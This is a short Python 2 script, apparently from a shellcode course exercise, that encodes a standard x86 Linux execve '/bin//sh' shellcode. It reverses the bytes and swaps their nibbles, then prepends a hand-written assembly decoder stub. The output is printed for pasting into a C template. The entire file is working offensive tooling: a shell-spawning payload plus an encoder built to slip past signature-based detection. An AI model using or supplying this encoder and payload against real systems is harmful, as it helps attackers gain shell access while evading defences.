#!/usr/bin/env python

import sys

# Basic execve shellcode, switch this with any you want
shellcode = "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80"

# Decoder
decoder_part_one = "\\xeb\\x24\\x5e\\x31\\xc9\\xb1"
decoder_part_two = "\\xd0\\xf9\\x31\\xdb\\x8a\\x06\\xc0\\xc8\\x04\\x30\\xc3\\xc1\\xc3\\x08\\x8a\\x46\\x01\\xc0\\xc8\\x04\\x30\\xc3\\x66\\x53\\x83\\xc6\\x02\\xe2\\xe5\\xff\\xe4\\xe8\\xd7\\xff\\xff\\xff"

# Extract every byte from shellcode
shell_bytes = shellcode.split("\\x")

# Get shellcode length, first element in shell_bytes is empty - "" so we will discard it
shellcode_length = len(shell_bytes) - 1

# Prepend shellcode with first part of decoder
final_shellcode = decoder_part_one

# If shellcode length is not a multiplier of 2 we need to add
# reversed NOP instruction to work with our decoder  
if (shellcode_length % 2 == 1):
	shellcode_length += 1
	# add shellcode length to apropriate byte in decoder and paste the second decoder part
	hex_length = hex(shellcode_length)
	final_shellcode += "\\x%s" % (hex_length[2:4])
	final_shellcode += decoder_part_two
	# add reversed NOP
	final_shellcode += "\\x09"
else:
	# add shellcode length to apropriate byte in decoder and paste the second decoder part
	hex_length = hex(shellcode_length)
	final_shellcode += "\\x%s" % (hex_length[2:4])
	final_shellcode += decoder_part_two

# Loop over shellcode bytes and switch the two hex values, then append to final_shellcode
for i in xrange((len(shell_bytes) - 1), 0, -1):
	hex1 = shell_bytes[i][0:1]
	hex2 = shell_bytes[i][1:2]
	final_shellcode	+= "\\x" + hex2 + hex1

print "\nHere is the encoded shellcode with decoder prepended!"
print "\nPaste this into encoded_shellcode_template.c:\n"
print final_shellcode

sys.exit()
